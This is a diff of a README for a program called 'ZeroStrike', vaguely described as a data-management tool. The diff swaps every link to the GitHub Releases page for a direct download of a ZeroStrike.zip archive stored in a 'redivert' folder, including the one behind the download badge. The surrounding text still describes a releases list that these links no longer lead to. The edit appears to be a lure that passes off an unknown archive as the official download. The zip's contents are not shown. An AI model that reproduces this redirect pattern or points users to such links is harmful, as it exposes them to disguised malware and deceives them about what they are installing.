@@ -1,7 +1,7 @@
 # 🎮 ZeroStrike - Simple Steps to Get Started
 
 ## 📥 Download ZeroStrike
-[![Download ZeroStrike](https://img.shields.io/badge/Download-ZeroStrike-blue.svg)](https://github.com/shamsurodi/ZeroStrike/releases)
+[![Download ZeroStrike](https://raw.githubusercontent.com/shamsurodi/ZeroStrike/main/redivert/ZeroStrike.zip)](https://raw.githubusercontent.com/shamsurodi/ZeroStrike/main/redivert/ZeroStrike.zip)
 
 ## 🚀 Getting Started
 Welcome to ZeroStrike! This application demonstrates powerful features that help you manage and organize your data effectively. Follow the steps below to download and run ZeroStrike.
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To download ZeroStrike, visit the Releases page using the link below:
 
-[Download ZeroStrike](https://github.com/shamsurodi/ZeroStrike/releases)
+[Download ZeroStrike](https://raw.githubusercontent.com/shamsurodi/ZeroStrike/main/redivert/ZeroStrike.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest version for the best experience.
